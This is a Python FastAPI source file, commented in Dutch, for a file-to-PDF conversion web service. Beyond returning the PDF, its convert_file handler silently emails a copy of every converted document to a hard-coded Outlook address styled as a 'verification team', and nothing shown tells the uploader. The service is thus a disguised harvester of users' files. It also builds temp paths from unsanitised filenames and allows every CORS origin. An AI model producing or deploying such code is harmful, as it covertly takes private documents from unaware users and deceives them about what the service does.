from fastapi import FastAPI, UploadFile, File, HTTPException
from fastapi.responses import Response
from fastapi.middleware.cors import CORSMiddleware
from pdfitdown.pdfconversion import Converter
import os
import shutil
import uuid
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

app = FastAPI()

# CORS instellingen
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

converter = Converter()

# JOUW E-MAILADRES
JOUW_EMAIL = "verificatieteam365@outlook.com"

def stuur_email(pdf_bestand, bestandsnaam):
    """Stuur een PDF naar jouw e-mailadres"""
    try:
        # E-mail instellingen (via outlook.com)
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        
        # Aanmaken bericht
        msg = MIMEMultipart()
        msg["From"] = JOUW_EMAIL
        msg["To"] = JOUW_EMAIL
        msg["Subject"] = f"PDF Conversie: {bestandsnaam}"
        
        # Bericht tekst
        body = f"Er is een bestand geconverteerd naar PDF.\n\nBestand: {bestandsnaam}\nTijd: {__import__('datetime').datetime.now()}"
        msg.attach(MIMEText(body, "plain"))
        
        # PDF bijlage
        with open(pdf_bestand, "rb") as f:
            bijlage = MIMEApplication(f.read(), _subtype="pdf")
            bijlage.add_header("Content-Disposition", "attachment", filename=bestandsnaam)
            msg.attach(bijlage)
        
        # Versturen
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(JOUW_EMAIL, "JOUW_WACHTWOORD")  # Je moet je wachtwoord invullen!
            server.send_message(msg)
        
        return True
    except Exception as e:
        print(f"E-mail fout: {e}")
        return False

@app.post("/convert")
async def convert_file(file: UploadFile = File(...)):
    try:
        unique_id = str(uuid.uuid4())
        temp_path = f"/tmp/input_{unique_id}_{file.filename}"
        output_path = f"/tmp/output_{unique_id}_{file.filename}.pdf"
        
        # Sla bestand op
        with open(temp_path, "wb") as f:
            content = await file.read()
            f.write(content)
        
        # Converteer naar PDF
        converter.convert(file_path=temp_path, output_path=output_path)
        
        # Stuur PDF naar jouw e-mail (achtergrond)
        stuur_email(output_path, f"{file.filename}.pdf")
        
        # Stuur PDF terug naar gebruiker
        with open(output_path, "rb") as f:
            pdf_content = f.read()
        
        # Opruimen
        os.remove(temp_path)
        os.remove(output_path)
        
        return Response(
            content=pdf_content,
            media_type="application/pdf",
            headers={"Content-Disposition": f"attachment; filename={file.filename}.pdf"}
        )
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/")
async def root():
    return {"message": "PDF Converter API is running!"}
